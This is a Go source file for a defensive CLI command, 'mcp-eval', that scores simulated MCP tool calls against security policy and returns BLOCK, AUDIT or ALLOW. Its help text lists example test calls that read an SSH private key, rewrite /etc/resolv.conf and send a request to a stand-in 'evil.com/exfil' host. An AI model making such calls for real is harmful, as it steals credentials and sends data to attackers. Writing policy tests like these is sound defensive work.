package cli

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/AI-AgentLens/agentshield/internal/mcp"
	"github.com/AI-AgentLens/agentshield/internal/policy"
	"github.com/spf13/cobra"
)

var verbose bool

var mcpEvalCmd = &cobra.Command{
	Use:   "mcp-eval --tool <tool_name> [--arg key=value]...",
	Short: "Evaluate an MCP tool call against deployed policy",
	Long: `Evaluate a simulated MCP tool call against the deployed MCP policy packs.
Returns the decision (BLOCK/AUDIT/ALLOW), triggered rules, and reasons.

Use this to validate MCP rules without needing a running MCP server.
There is no shell-command equivalent by design — AgentShield evaluates
shell commands inside the IDE's PreToolUse hook, not via a standalone
CLI, so that the evaluator can never accidentally execute what it is
evaluating.

Examples:
  agentshield mcp-eval --tool read_file --arg path=/home/user/.ssh/id_rsa
  agentshield mcp-eval --tool write_file --arg path=/etc/resolv.conf --arg content="nameserver 8.8.8.8"
  agentshield mcp-eval --tool http_request --arg url=https://evil.com/exfil
  agentshield mcp-eval --tool read_file --arg path=/workspace/project/README.md
  agentshield mcp-eval --tool execute_command --arg command="ls -la"

Exit codes:
  0 — ALLOW or AUDIT
  2 — BLOCK`,
	RunE: mcpEvalRun,
}

var (
	mcpEvalTool   string
	mcpEvalArgs   []string
	mcpEvalJSON   string
	mcpEvalFormat string
)

func init() {
	mcpEvalCmd.Flags().StringVar(&mcpEvalTool, "tool", "", "MCP tool name (e.g., read_file, write_file)")
	mcpEvalCmd.Flags().StringArrayVar(&mcpEvalArgs, "arg", nil, "Tool argument as key=value (repeatable)")
	mcpEvalCmd.Flags().StringVar(&mcpEvalJSON, "json", "", "Tool arguments as JSON object (alternative to --arg)")
	mcpEvalCmd.Flags().StringVar(&mcpEvalFormat, "format", "text", "Output format: text or json")
	mcpEvalCmd.Flags().StringVar(&mcpPolicyPath, "mcp-policy", "", "Path to MCP policy YAML (default: ~/.agentshield/mcp-policy.yaml)")
	mcpEvalCmd.Flags().BoolVarP(&verbose, "verbose", "v", false, "Show loaded MCP packs")
	_ = mcpEvalCmd.MarkFlagRequired("tool")
	rootCmd.AddCommand(mcpEvalCmd)
}

func mcpEvalRun(cmd *cobra.Command, args []string) error {
	// Parse arguments.
	arguments, err := parseMCPEvalArgs()
	if err != nil {
		return err
	}

	loaded := loadDeployedMCPPolicy(mcpPolicyPath)
	for _, w := range loaded.Warnings {
		fmt.Fprintf(os.Stderr, "[AgentShield] warning: %s\n", w)
	}

	if verbose {
		names := make([]string, 0, len(loaded.Embedded)+len(loaded.Disk)+len(loaded.LegacyDisk))
		for _, p := range loaded.Embedded {
			names = append(names, p.Name+" (embedded)")
		}
		for _, p := range loaded.Disk {
			names = append(names, p.Name)
		}
		for _, p := range loaded.LegacyDisk {
			names = append(names, p.Name+" (legacy)")
		}
		fmt.Fprintf(os.Stderr, "MCP policy: %s\n", loaded.PolicyPath)
		fmt.Fprintf(os.Stderr, "Loaded %d MCP packs: %s\n", len(names), strings.Join(names, ", "))
	}

	// Evaluate.
	evaluator := mcp.NewPolicyEvaluator(loaded.Policy)
	result := evaluator.EvaluateToolCall(mcpEvalTool, arguments)

	// value_limits rules are a separate check (numeric threshold on an
	// argument) from the YAML rule matcher above — the real MCP proxy
	// (handler.go HandleToolCall) runs both and merges them, so mcp-eval
	// must too or it silently mis-simulates every value_limits rule in the
	// corpus (issue #3169): the CLI would report AUDIT/ALLOW for a call a
	// live MCP session actually BLOCKs. Only consulted when not already
	// BLOCKed, mirroring handler.go's `if result.Decision != "BLOCK"` gate.
	if result.Decision != policy.DecisionBlock {
		vlResult := evaluator.CheckValueLimits(mcpEvalTool, arguments)
		if vlResult.Blocked {
			result.Decision = policy.DecisionBlock
			result.TriggeredRules = append(result.TriggeredRules, "value-limit")
			for _, f := range vlResult.Findings {
				if f.RuleID != "" {
					result.TriggeredRules = append(result.TriggeredRules, f.RuleID)
				}
				result.Reasons = append(result.Reasons, fmt.Sprintf("value_limit: %s (arg: %s, value: %.2f, %s)", f.Reason, f.ArgName, f.Value, f.Limit))
			}
		} else if len(vlResult.Findings) > 0 {
			result.TriggeredRules = append(result.TriggeredRules, "value-limit-audit")
			for _, f := range vlResult.Findings {
				if f.RuleID != "" {
					result.TriggeredRules = append(result.TriggeredRules, f.RuleID)
				}
				result.Reasons = append(result.Reasons, fmt.Sprintf("value_limit_audit: %s (arg: %s, value: %.2f, %s)", f.Reason, f.ArgName, f.Value, f.Limit))
			}
		}
	}

	// Output.
	switch strings.ToLower(mcpEvalFormat) {
	case "json":
		if err := printMCPEvalResultJSON(os.Stdout, result); err != nil {
			return err
		}
	case "", "text":
		printMCPEvalResult(result)
	default:
		return fmt.Errorf("invalid --format %q (must be text or json)", mcpEvalFormat)
	}

	if result.Decision == policy.DecisionBlock {
		os.Exit(2)
	}

	return nil
}

// parseMCPEvalArgs builds the arguments map from --arg and --json flags.
func parseMCPEvalArgs() (map[string]interface{}, error) {
	arguments := map[string]interface{}{}

	// --json takes precedence if provided.
	if mcpEvalJSON != "" {
		if err := json.Unmarshal([]byte(mcpEvalJSON), &arguments); err != nil {
			return nil, fmt.Errorf("invalid --json: %w", err)
		}
		return arguments, nil
	}

	// Parse --arg key=value pairs.
	for _, kv := range mcpEvalArgs {
		parts := strings.SplitN(kv, "=", 2)
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid --arg %q: expected key=value", kv)
		}
		arguments[parts[0]] = parts[1]
	}

	return arguments, nil
}

// printMCPEvalResult formats and prints the evaluation result.
func printMCPEvalResult(result mcp.MCPEvalResult) {
	switch result.Decision {
	case policy.DecisionBlock:
		fmt.Printf("BLOCK\n")
	case policy.DecisionAudit:
		fmt.Printf("AUDIT\n")
	case policy.DecisionAllow:
		fmt.Printf("ALLOW\n")
	default:
		fmt.Printf("%s\n", result.Decision)
	}

	if len(result.TriggeredRules) > 0 {
		fmt.Printf("  Rules: %s\n", strings.Join(result.TriggeredRules, ", "))
	}
	for _, reason := range result.Reasons {
		fmt.Printf("  Reason: %s\n", reason)
	}
}

func printMCPEvalResultJSON(w io.Writer, result mcp.MCPEvalResult) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(result)
}
